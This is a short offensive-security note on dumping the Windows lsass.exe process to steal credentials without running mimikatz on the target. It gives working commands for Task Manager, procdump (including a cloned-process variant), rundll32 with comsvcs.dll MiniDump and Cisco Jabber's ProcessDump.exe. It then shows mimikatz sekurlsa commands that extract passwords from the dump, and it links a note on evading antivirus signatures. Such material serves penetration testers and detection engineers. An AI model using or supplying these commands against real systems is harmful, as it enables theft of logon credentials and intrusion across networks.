# Dumping Lsass Without Mimikatz

## MiniDumpWriteDump API

See my notes about writing a simple custom process dumper using `MiniDumpWriteDump` API:


[dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md](dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md)


## Task Manager

Create a minidump of the lsass.exe using task manager (must be running as administrator):

![[Screenshot from 2019-03-12 19-55-27.png]]

![[Screenshot from 2019-03-12 19-56-12.png]]

Swtich mimikatz context to the minidump:

```csharp
// attacker@mimikatz
sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
```

![[Screenshot from 2019-03-12 19-54-15.png]]

## Procdump

Procdump from sysinternal's could also be used to dump the process:

```csharp
// attacker@victim
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

![[Screenshot from 2019-03-12 20-11-28.png]]

![[Screenshot from 2019-03-12 20-13-25.png]]

## comsvcs.dll

Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:

```
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

![[image (165).png]]

## ProcessDump.exe from Cisco Jabber

Sometimes Cisco Jabber (always?) comes with a nice utility called `ProcessDump.exe` that can be found in `c:\program files (x86)\cisco systems\cisco jabber\x64\`. We can use it to dump lsass process memory in Powershell like so:

```
cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```

![[image (634).png|screenshot by @em1rerdogan]]

## References

[t.co/s2VePo3ICo?amp=1](https://t.co/s2VePo3ICo?amp=1)
